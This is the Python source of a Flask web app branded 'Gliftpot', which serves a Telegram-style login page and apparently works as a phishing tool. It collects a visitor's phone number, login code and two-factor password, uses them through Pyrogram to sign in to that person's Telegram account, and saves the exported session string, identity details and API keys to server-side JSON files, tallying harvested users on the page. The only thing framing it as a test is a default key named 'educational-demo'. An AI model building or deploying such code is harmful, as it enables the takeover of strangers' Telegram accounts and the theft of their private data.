import os
import asyncio
import logging
import time
import threading
import json
from datetime import datetime
from flask import Flask, request, jsonify
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded, 
    PhoneCodeInvalid, 
    PhoneNumberInvalid, 
    PhoneCodeExpired,
    FloodWait
)

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

class JSONStorageManager:
    """Менеджер JSON хранилища"""
    def __init__(self):
        self.storage_path = "./tdata_storage"
        self.init_storage()
    
    def init_storage(self):
        """Инициализация хранилища"""
        try:
            os.makedirs(f"{self.storage_path}/users", exist_ok=True)
            os.makedirs(f"{self.storage_path}/sessions", exist_ok=True)
            os.makedirs(f"{self.storage_path}/tdata", exist_ok=True)
            logger.info("✅ JSON хранилище инициализировано")
        except Exception as e:
            logger.error(f"❌ Ошибка инициализации хранилища: {e}")
    
    def save_user(self, user_data):
        """Сохранение пользователя"""
        try:
            user_file = f"{self.storage_path}/users/{user_data['id']}.json"
            with open(user_file, 'w', encoding='utf-8') as f:
                json.dump(user_data, f, indent=2, ensure_ascii=False)
            return True
        except Exception as e:
            logger.error(f"❌ Ошибка сохранения пользователя: {e}")
            return False
    
    def save_session(self, user_id, session_data, request_info=None):
        """Сохранение сессии"""
        try:
            session_id = int(time.time() * 1000)
            session_file = f"{self.storage_path}/sessions/{session_id}.json"
            
            session_record = {
                'id': session_id,
                'user_id': user_id,
                'session_data': session_data,
                'request_info': request_info,
                'created_at': datetime.now().isoformat(),
                'is_active': True
            }
            
            with open(session_file, 'w', encoding='utf-8') as f:
                json.dump(session_record, f, indent=2, ensure_ascii=False)
            
            return session_id
        except Exception as e:
            logger.error(f"❌ Ошибка сохранения сессии: {e}")
            return None
    
    def save_tdata(self, user_id, session_id, tdata_json):
        """Сохранение TData"""
        try:
            tdata_id = int(time.time() * 1000)
            tdata_file = f"{self.storage_path}/tdata/{tdata_id}.json"
            
            tdata_record = {
                'id': tdata_id,
                'user_id': user_id,
                'session_id': session_id,
                'tdata_json': tdata_json,
                'exported_at': datetime.now().isoformat()
            }
            
            with open(tdata_file, 'w', encoding='utf-8') as f:
                json.dump(tdata_record, f, indent=2, ensure_ascii=False)
            
            return tdata_id
        except Exception as e:
            logger.error(f"❌ Ошибка сохранения TData: {e}")
            return None
    
    def get_user_sessions(self, user_id):
        """Получение сессий пользователя"""
        try:
            sessions = []
            sessions_dir = f"{self.storage_path}/sessions"
            
            if not os.path.exists(sessions_dir):
                return []
            
            for filename in os.listdir(sessions_dir):
                if filename.endswith('.json'):
                    filepath = os.path.join(sessions_dir, filename)
                    with open(filepath, 'r', encoding='utf-8') as f:
                        session_data = json.load(f)
                        if session_data.get('user_id') == user_id:
                            sessions.append({
                                'id': session_data['id'],
                                'session_string': session_data['session_data'].get('session_string'),
                                'dc_id': session_data['session_data'].get('dc_id'),
                                'created_at': session_data['created_at'],
                                'is_active': session_data.get('is_active', True)
                            })
            
            return sorted(sessions, key=lambda x: x['created_at'], reverse=True)
        except Exception as e:
            logger.error(f"❌ Ошибка получения сессий: {e}")
            return []
    
    def get_stats(self):
        """Статистика хранилища"""
        try:
            users_dir = f"{self.storage_path}/users"
            sessions_dir = f"{self.storage_path}/sessions"
            tdata_dir = f"{self.storage_path}/tdata"
            
            users_count = len([f for f in os.listdir(users_dir) if f.endswith('.json')]) if os.path.exists(users_dir) else 0
            sessions_count = len([f for f in os.listdir(sessions_dir) if f.endswith('.json')]) if os.path.exists(sessions_dir) else 0
            tdata_count = len([f for f in os.listdir(tdata_dir) if f.endswith('.json')]) if os.path.exists(tdata_dir) else 0
            
            return {
                'total_users': users_count,
                'active_sessions': sessions_count,
                'total_tdata_records': tdata_count
            }
        except Exception as e:
            logger.error(f"❌ Ошибка получения статистики: {e}")
            return {'total_users': 0, 'active_sessions': 0, 'total_tdata_records': 0}

# Инициализация хранилища
storage = JSONStorageManager()

# Создаем отдельный event loop для асинхронных операций
class AsyncRunner:
    def __init__(self):
        self.loop = asyncio.new_event_loop()
        self.thread = threading.Thread(target=self._run_loop, daemon=True)
        self.thread.start()
    
    def _run_loop(self):
        asyncio.set_event_loop(self.loop)
        self.loop.run_forever()
    
    def run_coroutine(self, coro):
        future = asyncio.run_coroutine_threadsafe(coro, self.loop)
        return future.result(timeout=30)

# Глобальный runner для асинхронных операций
async_runner = AsyncRunner()

# Добавляем CORS headers
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response

def load_api_keys():
    """Загружаем API ключи с проверкой"""
    try:
        from dotenv import load_dotenv
        load_dotenv()
        logger.info("✅ .env файл загружен")
    except ImportError:
        logger.warning("⚠️ python-dotenv не установлен")
    
    # Получаем ключи из переменных окружения
    api_id = os.getenv('TELEGRAM_API_ID')
    api_hash = os.getenv('TELEGRAM_API_HASH')
    secret_key = os.getenv('SECRET_KEY', 'educational-demo-secret-key-2024')
    
    return api_id, api_hash, secret_key

# Загружаем ключи при старте
API_ID, API_HASH, SECRET_KEY = load_api_keys()
app.secret_key = SECRET_KEY

# Хранилище активных сессий
ACTIVE_SESSIONS = {}

class TelegramAuthTester:
    def __init__(self):
        self.api_id = None
        self.api_hash = None
        self.initialized = False
        self.initialize_client()
        
    def initialize_client(self):
        """Инициализируем клиент с проверкой ключей"""
        try:
            if not API_ID or not API_HASH:
                logger.error("❌ API ключи не установлены")
                self.initialized = False
                return
                
            self.api_id = int(API_ID)
            self.api_hash = API_HASH
            self.initialized = True
            logger.info(f"✅ Pyrogram тестер инициализирован с API_ID: {self.api_id}")
            
        except ValueError as e:
            logger.error(f"❌ Неверный формат API_ID: {e}")
            self.initialized = False
        except Exception as e:
            logger.error(f"❌ Ошибка инициализации: {e}")
            self.initialized = False
    
    async def request_code(self, phone_number):
        """Запрос кода аутентификации"""
        if not self.initialized:
            return {'success': False, 'error': 'Клиент не инициализирован'}
            
        client = None
        try:
            # Создаем уникальное имя сессии
            session_id = f"{phone_number}_{int(time.time())}"
            
            # Создаем клиента
            client = Client(
                name=session_id,
                api_id=self.api_id,
                api_hash=self.api_hash,
                in_memory=True
            )
            
            await client.connect()
            
            # Запрашиваем код
            logger.info(f"📱 Запрос кода для: {phone_number}")
            sent_code = await client.send_code(phone_number)
            
            # Сохраняем сессию
            ACTIVE_SESSIONS[session_id] = {
                'client': client,
                'phone': phone_number,
                'phone_code_hash': sent_code.phone_code_hash,
                'created_at': time.time()
            }
            
            logger.info(f"📱 Код отправлен. Session: {session_id}")
            logger.info(f"📱 Phone code hash: {sent_code.phone_code_hash}")
            
            return {
                'success': True,
                'message': 'Код отправлен в Telegram!',
                'session_id': session_id
            }
            
        except Exception as e:
            logger.error(f"❌ Ошибка запроса кода: {e}")
            if client:
                try:
                    await client.disconnect()
                except:
                    pass
            return {'success': False, 'error': f'Ошибка: {str(e)}'}
    
    async def verify_code(self, session_id, code):
        """Верификация кода"""
        if session_id not in ACTIVE_SESSIONS:
            return {'success': False, 'error': 'Сессия не найдена или истекла'}
            
        session_data = ACTIVE_SESSIONS[session_id]
        client = session_data['client']
        phone = session_data['phone']
        phone_code_hash = session_data['phone_code_hash']
        
        try:
            logger.info(f"🔐 Верификация кода {code} для {phone}")
            
            # Пытаемся войти с кодом
            await client.sign_in(
                phone_number=phone,
                phone_code_hash=phone_code_hash,
                phone_code=code
            )
            
            logger.info("✅ Успешная аутентификация")
            
            # Получаем информацию о пользователе
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'phone_number': me.phone_number,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'username': me.username
            }
            
            # Экспортируем TData
            export_result = await self.export_tdata(client, user_info)
            
            # Очищаем сессию
            await client.disconnect()
            del ACTIVE_SESSIONS[session_id]
            
            if export_result['success']:
                return {
                    'success': True,
                    'message': 'Аутентификация и экспорт TData успешны!',
                    'user_info': user_info,
                    'export_info': export_result
                }
            else:
                return export_result
                
        except SessionPasswordNeeded:
            logger.info("🔒 Требуется 2FA пароль")
            # Обновляем статус сессии
            session_data['needs_password'] = True
            ACTIVE_SESSIONS[session_id] = session_data
            
            return {
                'success': True,
                'message': 'Требуется пароль 2FA',
                'needs_password': True,
                'session_id': session_id
            }
            
        except PhoneCodeInvalid as e:
            logger.warning(f"⚠️ Неверный код: {e}")
            return {'success': False, 'error': 'Неверный код подтверждения'}
            
        except PhoneCodeExpired as e:
            logger.warning(f"⏰ Код истек: {e}")
            await client.disconnect()
            del ACTIVE_SESSIONS[session_id]
            return {'success': False, 'error': 'Код истек. Запросите новый.'}
            
        except FloodWait as e:
            logger.warning(f"⏳ Flood wait: {e.value} секунд")
            await client.disconnect()
            del ACTIVE_SESSIONS[session_id]
            return {
                'success': False, 
                'error': f'Слишком много попыток. Попробуйте через {e.value} секунд.'
            }
            
        except Exception as e:
            logger.error(f"❌ Ошибка верификации: {e}")
            try:
                await client.disconnect()
            except:
                pass
            if session_id in ACTIVE_SESSIONS:
                del ACTIVE_SESSIONS[session_id]
            return {'success': False, 'error': f'Ошибка: {str(e)}'}
    
    async def verify_password(self, session_id, password):
        """Верификация пароля 2FA"""
        if session_id not in ACTIVE_SESSIONS:
            return {'success': False, 'error': 'Сессия не найдена'}
            
        session_data = ACTIVE_SESSIONS[session_id]
        if not session_data.get('needs_password'):
            return {'success': False, 'error': 'Неверный статус сессии'}
            
        client = session_data['client']
        
        try:
            logger.info("🔑 Верификация пароля 2FA")
            
            # Входим с паролем
            await client.check_password(password=password)
            
            logger.info("✅ Успешная аутентификация с паролем 2FA")
            
            # Получаем информацию о пользователе
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'phone_number': me.phone_number,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'username': me.username
            }
            
            # Экспортируем TData
            export_result = await self.export_tdata(client, user_info)
            
            # Очищаем сессию
            await client.disconnect()
            del ACTIVE_SESSIONS[session_id]
            
            if export_result['success']:
                return {
                    'success': True,
                    'message': 'Аутентификация и экспорт TData успешны!',
                    'user_info': user_info,
                    'export_info': export_result
                }
            else:
                return export_result
                
        except Exception as e:
            logger.error(f"❌ Ошибка верификации пароля: {e}")
            try:
                await client.disconnect()
            except:
                pass
            if session_id in ACTIVE_SESSIONS:
                del ACTIVE_SESSIONS[session_id]
            return {'success': False, 'error': 'Неверный пароль 2FA'}
    
    async def export_tdata(self, client, user_info, request_info=None):
        """Экспорт TData - исправленная версия"""
        try:
            # Экспортируем session string
            session_string = await client.export_session_string()
        
            # Получаем информацию о дата-центре
            dc_info = await client.storage.dc_id()
            dc_id = dc_info if dc_info else 2  # Значение по умолчанию
        
            # Получаем базовую информацию о клиенте
            tdata_info = {
                'version': '1.0',
                'user_id': user_info['id'],
                'phone_number': user_info.get('phone_number', ''),
                'first_name': user_info.get('first_name', ''),
                'last_name': user_info.get('last_name', ''),
                'username': user_info.get('username', ''),
                'session_string': session_string,
                'dc_id': dc_id,  # Используем полученный dc_id
                'api_id': self.api_id,
                'api_hash': self.api_hash,
                'device_model': 'Pyrogram Export',
                'system_version': '1.0',
                'app_version': '1.0',
                'lang_code': 'en',
                'system_lang_code': 'en',
                'exported_at': datetime.now().isoformat(),
                'session_type': 'pyrogram_string_session'
            }
        
            # Сохраняем пользователя
            storage.save_user(user_info)
        
            # Сохраняем сессию
            session_data = {
                'session_string': session_string,
                'dc_id': dc_id,  # И здесь тоже исправляем
                'api_id': self.api_id,
                'api_hash': self.api_hash,
                'device_model': 'Pyrogram Export',
                'system_version': '1.0',
                'app_version': '1.0',
                'lang_code': 'en',
                'system_lang_code': 'en'
            }
        
            session_id = storage.save_session(
                user_info['id'], 
                session_data, 
                request_info
            )
        
            if session_id:
                # Сохраняем полный TData
                tdata_id = storage.save_tdata(
                    user_info['id'], 
                    session_id, 
                    tdata_info
                )
            
                logger.info(f"💾 TData сохранен. Session ID: {session_id}, TData ID: {tdata_id}")
            
                return {
                    'success': True,
                    'session_id': session_id,
                    'tdata_id': tdata_id,
                    'user_id': user_info['id'],
                    'session_string': session_string,
                    'message': 'TData успешно экспортирован в JSON хранилище'
                }
            else:
                return {'success': False, 'error': 'Ошибка сохранения сессии'}
            
        except Exception as e:
            logger.error(f"❌ Ошибка экспорта TData: {e}")
            return {'success': False, 'error': f'Ошибка экспорта: {str(e)}'}

# Инициализация
auth_tester = TelegramAuthTester()

# 🎯 Главная страница с HTML интерфейсом
@app.route('/')
def home():
    """Главная страница с космическим интерфейсом"""
    stats = storage.get_stats()
    
    return f'''
<!DOCTYPE html>
<html>
<head>
    <title>Gliftpot - Telegram Auth</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"></script>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}

        body {{
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #1a0033 0%, #4a0072 50%, #8a2be2 100%);
            min-height: 100vh;
            color: white;
            overflow-x: hidden;
            position: relative;
        }}

        /* Космические элементы фона */
        body::before {{
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(255, 119, 198, 0.15) 0%, transparent 50%),
                radial-gradient(circle at 40% 40%, rgba(120, 219, 255, 0.2) 0%, transparent 50%);
            pointer-events: none;
            z-index: -1;
        }}

        .stars {{
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
        }}

        .star {{
            position: absolute;
            background: white;
            border-radius: 50%;
            animation: twinkle 5s infinite;
        }}

        @keyframes twinkle {{
            0%, 100% {{ opacity: 0.2; }}
            50% {{ opacity: 1; }}
        }}

        .container {{
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }}

        .logo {{
            text-align: center;
            margin-bottom: 30px;
            animation: float 6s ease-in-out infinite;
        }}

        @keyframes float {{
            0%, 100% {{ transform: translateY(0px); }}
            50% {{ transform: translateY(-10px); }}
        }}

        .logo h1 {{
            font-size: 3.5rem;
            font-weight: bold;
            background: linear-gradient(45deg, #ff6bff, #9d4edd, #5a00b5);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-shadow: 0 0 30px rgba(255, 107, 255, 0.5);
            margin-bottom: 10px;
        }}

        .logo p {{
            font-size: 1.1rem;
            opacity: 0.8;
            letter-spacing: 2px;
        }}

        .auth-card {{
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 20px;
            padding: 40px 30px;
            width: 100%;
            text-align: center;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            margin-bottom: 30px;
        }}

        .animation-container {{
            width: 200px;
            height: 200px;
            margin: 0 auto 20px;
        }}

        .start-btn {{
            background: linear-gradient(45deg, #ff6bff, #9d4edd);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 1.2rem;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 20px rgba(255, 107, 255, 0.4);
            margin-top: 20px;
        }}

        .start-btn:hover {{
            transform: translateY(-2px);
            box-shadow: 0 6px 25px rgba(255, 107, 255, 0.6);
        }}

        .start-btn:active {{
            transform: translateY(0);
        }}

        .step {{
            display: none;
            width: 100%;
            animation: fadeIn 0.5s ease;
        }}

        @keyframes fadeIn {{
            from {{ opacity: 0; transform: translateY(20px); }}
            to {{ opacity: 1; transform: translateY(0); }}
        }}

        .step.active {{
            display: block;
        }}

        .step h3 {{
            font-size: 1.5rem;
            margin-bottom: 25px;
            color: #ff6bff;
            text-shadow: 0 0 10px rgba(255, 107, 255, 0.5);
        }}

        .input-group {{
            margin-bottom: 20px;
            text-align: left;
        }}

        .input-group label {{
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #e0c3ff;
        }}

        .input-group input {{
            width: 100%;
            padding: 15px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 10px;
            color: white;
            font-size: 1rem;
            transition: all 0.3s ease;
        }}

        .input-group input:focus {{
            outline: none;
            border-color: #ff6bff;
            box-shadow: 0 0 15px rgba(255, 107, 255, 0.3);
            background: rgba(255, 255, 255, 0.15);
        }}

        .input-group input::placeholder {{
            color: rgba(255, 255, 255, 0.6);
        }}

        .btn {{
            background: linear-gradient(45deg, #ff6bff, #9d4edd);
            color: white;
            border: none;
            padding: 12px 30px;
            font-size: 1rem;
            border-radius: 25px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(255, 107, 255, 0.4);
            width: 100%;
            margin-top: 10px;
        }}

        .btn:hover {{
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(255, 107, 255, 0.6);
        }}

        .btn:disabled {{
            background: rgba(255, 255, 255, 0.2);
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }}

        .alert {{
            padding: 15px;
            margin: 20px 0;
            border-radius: 10px;
            text-align: left;
            animation: slideIn 0.3s ease;
        }}

        @keyframes slideIn {{
            from {{ opacity: 0; transform: translateX(-20px); }}
            to {{ opacity: 1; transform: translateX(0); }}
        }}

        .success {{
            background: rgba(76, 175, 80, 0.2);
            border: 1px solid rgba(76, 175, 80, 0.5);
            color: #a5d6a7;
        }}

        .error {{
            background: rgba(244, 67, 54, 0.2);
            border: 1px solid rgba(244, 67, 54, 0.5);
            color: #ef9a9a;
        }}

        .info {{
            background: rgba(33, 150, 243, 0.2);
            border: 1px solid rgba(33, 150, 243, 0.5);
            color: #90caf9;
        }}

        .warning {{
            background: rgba(255, 193, 7, 0.2);
            border: 1px solid rgba(255, 193, 7, 0.5);
            color: #fff59d;
        }}

        .user-info {{
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 20px;
            margin: 20px 0;
            text-align: left;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }}

        .user-info h4 {{
            color: #ff6bff;
            margin-bottom: 15px;
            text-align: center;
        }}

        .user-info p {{
            margin: 8px 0;
            color: #e0c3ff;
        }}

        .stats {{
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 20px;
            margin-top: 20px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }}

        .stats h4 {{
            color: #ff6bff;
            margin-bottom: 15px;
        }}

        .hidden {{
            display: none;
        }}

        .back-btn {{
            background: rgba(255, 255, 255, 0.1);
            color: white;
            border: 1px solid rgba(255, 255, 255, 0.3);
            padding: 10px 20px;
            border-radius: 20px;
            cursor: pointer;
            margin-top: 15px;
            transition: all 0.3s ease;
        }}

        .back-btn:hover {{
            background: rgba(255, 255, 255, 0.2);
        }}
    </style>
</head>
<body>
    <!-- Космический фон со звездами -->
    <div class="stars" id="stars"></div>

    <div class="container">
        <!-- Логотип и заголовок -->
        <div class="logo">
            <h1>Gliftpot</h1>
            <p>TELEGRAM AUTH SYSTEM</p>
        </div>

        <!-- Основная карточка авторизации -->
        <div class="auth-card">
            <!-- Начальный экран -->
            <div id="startStep" class="step active">
                <div class="animation-container">
                    <lottie-player 
                        src="https://lottie.host/82e23552-567e-4c66-a027-93846151fddc/HcJhk6i72d.lottie" 
                        background="transparent" 
                        speed="1" 
                        loop 
                        autoplay>
                    </lottie-player>
                </div>
                <h3>Добро пожаловать в космос Gliftpot</h3>
                <p>Начните авторизацию через Telegram для доступа к системе</p>
                <button class="start-btn" onclick="startAuth()">
                    🚀 Авторизация через Telegram
                </button>
            </div>

            <!-- Шаг 1: Ввод номера телефона -->
            <div id="step1" class="step">
                <h3>📱 Введите номер телефона</h3>
                <div class="input-group">
                    <label for="phone">Номер телефона:</label>
                    <input type="text" id="phone" placeholder="+1234567890" value="">
                </div>
                <button class="btn" onclick="requestCode()" id="requestBtn">Получить код</button>
                <button class="back-btn" onclick="showStep('startStep')">← Назад</button>
            </div>

            <!-- Шаг 2: Ввод кода -->
            <div id="step2" class="step">
                <h3>🔢 Введите код из Telegram</h3>
                <div class="input-group">
                    <label for="code">5-значный код:</label>
                    <input type="text" id="code" placeholder="12345" maxlength="5">
                </div>
                <button class="btn" onclick="verifyCode()" id="verifyBtn">Проверить код</button>
                <button class="back-btn" onclick="showStep('step1')">← Назад</button>
            </div>

            <!-- Шаг 3: Пароль 2FA -->
            <div id="step3" class="step">
                <h3>🔒 Введите пароль 2FA</h3>
                <div class="alert info">
                    Этот аккаунт защищен двухфакторной аутентификацией
                </div>
                <div class="input-group">
                    <label for="password">Пароль 2FA:</label>
                    <input type="password" id="password" placeholder="Введите пароль">
                </div>
                <button class="btn" onclick="verifyPassword()" id="passwordBtn">Проверить пароль</button>
                <button class="back-btn" onclick="showStep('step2')">← Назад</button>
            </div>

            <!-- Результаты -->
            <div id="results"></div>
        </div>

        <!-- Статистика -->
        <div class="stats" id="statsSection">
            <h4>📊 Статистика системы</h4>
            <p>Загрузка...</p>
        </div>
    </div>

    <script>
        // Создание звездного фона
        function createStars() {{
            const stars = document.getElementById('stars');
            const starsCount = 150;
            
            for (let i = 0; i < starsCount; i++) {{
                const star = document.createElement('div');
                star.className = 'star';
                
                const size = Math.random() * 2 + 1;
                star.style.width = size + 'px';
                star.style.height = size + 'px';
                
                star.style.left = Math.random() * 100 + '%';
                star.style.top = Math.random() * 100 + '%';
                star.style.animationDelay = Math.random() * 5 + 's';
                
                stars.appendChild(star);
            }}
        }}

        let currentSessionId = '';
        let currentPhone = '';

        // Показать определенный шаг
        function showStep(stepId) {{
            document.querySelectorAll('.step').forEach(step => {{
                step.classList.remove('active');
            }});
            document.getElementById(stepId).classList.add('active');
            document.getElementById('results').innerHTML = '';
        }}

        // Начать авторизацию
        function startAuth() {{
            showStep('step1');
            loadStats();
        }}

        // Показать уведомление
        function showAlert(message, type) {{
            const results = document.getElementById('results');
            results.innerHTML = '<div class="alert ' + type + '">' + message + '</div>';
        }}

        // Показать информацию о пользователе
        function showUserInfo(userInfo, exportInfo) {{
            const results = document.getElementById('results');
            results.innerHTML = `
                <div class="user-info">
                    <h4>✅ Успешная авторизация!</h4>
                    <p><strong>👤 Имя:</strong> ${{userInfo.first_name || 'Не указано'}}</p>
                    <p><strong>👥 Фамилия:</strong> ${{userInfo.last_name || 'Не указана'}}</p>
                    <p><strong>🔗 Username:</strong> @${{userInfo.username || 'Не указан'}}</p>
                    <p><strong>🆔 ID:</strong> ${{userInfo.id}}</p>
                    <p><strong>📞 Телефон:</strong> ${{userInfo.phone_number}}</p>
                    <p><strong>🔐 Session String:</strong> ${{exportInfo.session_string.substring(0, 50)}}...</p>
                    <p><strong>💾 TData ID:</strong> ${{exportInfo.tdata_id}}</p>
                </div>
                <button class="btn" onclick="location.reload()">🔄 Новая авторизация</button>
            `;
        }}

        // Загрузка статистики
        async function loadStats() {{
            try {{
                const response = await fetch('/api/storage/stats');
                if (response.ok) {{
                    const data = await response.json();
                    if (data.success) {{
                        const stats = data.statistics;
                        document.getElementById('statsSection').innerHTML = `
                            <h4>📊 Статистика системы</h4>
                            <p>👥 Пользователей: ${{stats.total_users}}</p>
                            <p>💾 Сессий: ${{stats.active_sessions}}</p>
                            <p>🗂️ TData записей: ${{stats.total_tdata_records}}</p>
                        `;
                    }}
                }}
            }} catch (error) {{
                console.error('Ошибка загрузки статистики:', error);
            }}
        }}

        // Запрос кода
        async function requestCode() {{
            const phone = document.getElementById('phone').value.trim();
            currentPhone = phone;

            if (!phone) {{
                showAlert('Введите номер телефона', 'error');
                return;
            }}

            const btn = document.getElementById('requestBtn');
            btn.disabled = true;
            btn.textContent = '📡 Отправка...';

            try {{
                const response = await fetch('/api/auth/request-code', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{phone: phone}})
                }});
                
                const data = await response.json();
                
                if (data.success) {{
                    currentSessionId = data.session_id;
                    showStep('step2');
                    showAlert('✅ Код отправлен в Telegram! Проверьте приложение и введите код.', 'success');
                    document.getElementById('code').focus();
                }} else {{
                    showAlert('❌ ' + data.error, 'error');
                }}
            }} catch (error) {{
                console.error('Error:', error);
                showAlert('❌ Ошибка сети: ' + error.message, 'error');
            }} finally {{
                btn.disabled = false;
                btn.textContent = 'Получить код';
            }}
        }}

        // Верификация кода
        async function verifyCode() {{
            const code = document.getElementById('code').value.trim();

            if (!code || code.length !== 5) {{
                showAlert('Введите 5-значный код из Telegram', 'error');
                return;
            }}

            const btn = document.getElementById('verifyBtn');
            btn.disabled = true;
            btn.textContent = '🔍 Проверка...';

            try {{
                const response = await fetch('/api/auth/verify-code', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        session_id: currentSessionId,
                        code: code
                    }})
                }});
                
                const data = await response.json();
                
                if (data.success) {{
                    if (data.needs_password) {{
                        showStep('step3');
                        showAlert('🔒 Требуется пароль двухфакторной аутентификации', 'info');
                        document.getElementById('password').focus();
                    }} else {{
                        showUserInfo(data.user_info, data.export_info);
                        loadStats();
                    }}
                }} else {{
                    showAlert('❌ ' + data.error, 'error');
                }}
            }} catch (error) {{
                console.error('Error:', error);
                showAlert('❌ Ошибка сети: ' + error.message, 'error');
            }} finally {{
                btn.disabled = false;
                btn.textContent = 'Проверить код';
            }}
        }}

        // Верификация пароля 2FA
        async function verifyPassword() {{
            const password = document.getElementById('password').value;

            if (!password) {{
                showAlert('Введите пароль 2FA', 'error');
                return;
            }}

            const btn = document.getElementById('passwordBtn');
            btn.disabled = true;
            btn.textContent = '🔍 Проверка...';

            try {{
                const response = await fetch('/api/auth/verify-password', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        session_id: currentSessionId,
                        password: password
                    }})
                }});
                
                const data = await response.json();
                
                if (data.success) {{
                    showUserInfo(data.user_info, data.export_info);
                    loadStats();
                }} else {{
                    showAlert('❌ ' + data.error, 'error');
                }}
            }} catch (error) {{
                console.error('Error:', error);
                showAlert('❌ Ошибка сети: ' + error.message, 'error');
            }} finally {{
                btn.disabled = false;
                btn.textContent = 'Проверить пароль';
            }}
        }}

        // Обработчики Enter
        document.getElementById('phone').addEventListener('keypress', function(e) {{
            if (e.key === 'Enter') requestCode();
        }});
        
        document.getElementById('code').addEventListener('keypress', function(e) {{
            if (e.key === 'Enter') verifyCode();
        }});

        document.getElementById('password').addEventListener('keypress', function(e) {{
            if (e.key === 'Enter') verifyPassword();
        }});

        // Инициализация
        document.addEventListener('DOMContentLoaded', function() {{
            createStars();
            loadStats();
        }});
    </script>
</body>
</html>
'''

# 🎯 API Endpoints (остаются без изменений)
@app.route('/api/auth/request-code', methods=['POST', 'OPTIONS'])
def request_code():
    """Запрос кода аутентификации"""
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'})
        
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
            
        phone = data.get('phone', '').strip()
        
        if not phone:
            return jsonify({'success': False, 'error': 'Введите номер телефона'}), 400
        
        result = async_runner.run_coroutine(auth_tester.request_code(phone))
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"❌ Ошибка запроса кода: {e}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500

@app.route('/api/auth/verify-code', methods=['POST', 'OPTIONS'])
def verify_code():
    """Верификация кода"""
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'})
        
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
            
        session_id = data.get('session_id', '').strip()
        code = data.get('code', '').strip()
        
        if not session_id or not code:
            return jsonify({'success': False, 'error': 'Введите код'}), 400
        
        result = async_runner.run_coroutine(auth_tester.verify_code(session_id, code))
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"❌ Ошибка верификации кода: {e}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500

@app.route('/api/auth/verify-password', methods=['POST', 'OPTIONS'])
def verify_password():
    """Верификация пароля 2FA"""
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'})
        
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
            
        session_id = data.get('session_id', '').strip()
        password = data.get('password', '')
        
        if not session_id or not password:
            return jsonify({'success': False, 'error': 'Введите пароль'}), 400
        
        result = async_runner.run_coroutine(auth_tester.verify_password(session_id, password))
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"❌ Ошибка верификации пароля: {e}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500

@app.route('/api/storage/stats', methods=['GET'])
def storage_stats():
    """Статистика хранилища"""
    try:
        stats = storage.get_stats()
        return jsonify({
            'success': True,
            'storage_type': 'JSON',
            'statistics': stats
        })
    except Exception as e:
        logger.error(f"❌ Ошибка получения статистики: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
